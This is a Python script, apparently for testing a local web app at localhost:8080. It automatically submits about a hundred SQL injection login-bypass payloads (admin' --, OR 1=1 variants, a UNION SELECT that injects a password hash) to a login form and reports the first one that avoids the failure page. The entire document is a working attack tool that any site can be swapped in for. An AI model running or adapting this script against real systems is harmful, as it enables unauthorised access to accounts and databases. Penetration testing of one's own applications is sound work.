import requests
from bs4 import BeautifulSoup
import sys
import time

# URL of running application
BASE_URL = "http://localhost:8080/"

# Failure message displayed on the invalid login page
FAILURE_TEXT = "The login credentials you supplied are not valid."

# Bunch of SQL injection payloads to test: https://github.com/payloadbox/sql-injection-payload-list
PAYLOADS = [
    "'",
    "''",
    "`",
    "``",
    ",",
    "\"",
    "\"\"",
    "/",
    "//",
    "\\",
    "\\\\",
    ";",
    "' or \"",
    "-- or #",
    "' OR '1",
    "' OR 1 -- -",
    "\" OR \"\" = \"",
    "\" OR 1 = 1 -- -",
    "' OR '' = '",
    "'='",
    "'LIKE'",
    "'=0--+",
    " OR 1=1",
    "' OR 'x'='x",
    "' AND id IS NULL; --",
    "'''''''''''''UNION SELECT '2",
    "-",
    " ",
    "&",
    "^",
    "*",
    " or '-",
    " or ' '",
    " or '&'",
    " or '^'",
    " or '*'",
    "-",
    " ",
    "&",
    "^",
    "*",
    " or \"-",
    " or \" \"",
    " or \"&\"",
    " or \"^\"",
    " or \"*\"",
    "or true--",
    "\" or true--",
    "' or true--",
    "\") or true--",
    "') or true--",
    "' or 'x'='x",
    "') or ('x')=('x",
    "')) or (('x'))=(('x",
    "\" or \"x\"=\"x",
    "\") or (\"x\")=(\"x",
    "\")) or ((\"x\"))=((\"x",
    "or 1=1",
    "or 1=1--",
    "or 1=1#",
    "or 1=1/*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "admin' or '1'='1",
    "admin' or '1'='1'--",
    "admin' or '1'='1'#",
    "admin' or '1'='1'/*",
    "admin'or 1=1 or ''='",
    "admin' or 1=1",
    "admin' or 1=1--",
    "admin' or 1=1#",
    "admin' or 1=1/*",
    "admin') or ('1'='1",
    "admin') or ('1'='1'--",
    "admin') or ('1'='1'#",
    "admin') or ('1'='1'/*",
    "admin') or '1'='1",
    "admin') or '1'='1'--",
    "admin') or '1'='1'#",
    "admin') or '1'='1'/*",
    "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
    "admin\" --",
    "admin\" #",
    "admin\"/*",
    "admin\" or \"1\"=\"1",
    "admin\" or \"1\"=\"1\"--",
    "admin\" or \"1\"=\"1\"#",
    "admin\" or \"1\"=\"1\"/*",
    "admin\"or 1=1 or \"\"=\"",
    "admin\" or 1=1",
    "admin\" or 1=1--",
    "admin\" or 1=1#",
    "admin\" or 1=1/*",
    "admin\") or (\"1\"=\"1",
    "admin\") or (\"1\"=\"1\"--",
    "admin\") or (\"1\"=\"1\"#",
    "admin\") or (\"1\"=\"1\"/*",
    "admin\") or \"1\"=\"1",
    "admin\") or \"1\"=\"1\"--",
    "admin\") or \"1\"=\"1\"#",
    "admin\") or \"1\"=\"1\"/*",
    "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055"
]

def normalize_payload(p):
    return p.split("\t", 1)[0]

PAYLOADS = [normalize_payload(p) for p in PAYLOADS]

session = requests.Session()
session.headers.update({
    "User-Agent": "sqli-tester/1.0",
})

def submit_payload(payload):
    data = {
        "username": payload,
        "password": payload,
        "surname": payload,
    }
    try:
        resp = session.post(BASE_URL, data=data, allow_redirects=True, timeout=10)
        return resp
    except requests.RequestException as e:
        print(f"Request error for payload {payload!r}: {e}", file=sys.stderr)
        return None
    
def is_failure_page(resp):
    if resp is None:
        return False
    text = resp.text or ""
    if FAILURE_TEXT in text:
        return True
    if 'Please <a href="/" class="alert-link">try again</a>' in text:
        return True
    return False

def follow_try_again_link(resp):
    if resp is None:
        return None
    soup = BeautifulSoup(resp.text, "html.parser")
    a = soup.find("a", string="try again")
    if not a:
        a = soup.find("a", href="/")
    if a:
        href = a.get("href", "/")
        try:
            return session.get(requests.compat.urljoin(resp.url, href), timeout=10)
        except requests.RequestException:
            return None
    return None

def main():
    print("Starting SQL injection payload test against", BASE_URL)
    for p in PAYLOADS:
        payload = p
        print(f"Testing payload: {payload!r}")
        resp = submit_payload(payload)
        # If we get the failure page (or redirect to it) -> print failed
        if is_failure_page(resp):
            print(f"Injection {payload} failed")
            # follow the try again link if present so next POST goes to the form page
            follow_try_again_link(resp)
            # small pause to avoid aggressive hammering
            time.sleep(0.2)
            continue
        # If not a failure page, check status or heuristics indicating success
        # (e.g., maybe the app returned a search result page / no failure text)
        if resp is None:
            print(f"Injection {payload} result: request error")
            continue
        # Heuristic: if we are still on the root page (form HTML) but without failure text,
        # it could be a different response. Print a message and continue.
        body = resp.text or ""
        if FAILURE_TEXT not in body:
            print(f"Injection {payload} may have succeeded or returned a non-failure response (inspect manually)")
            # Stop after first potential success
            break
        else:
            print(f"Injection {payload} failed")
        time.sleep(0.2)

if __name__ == "__main__":
    main()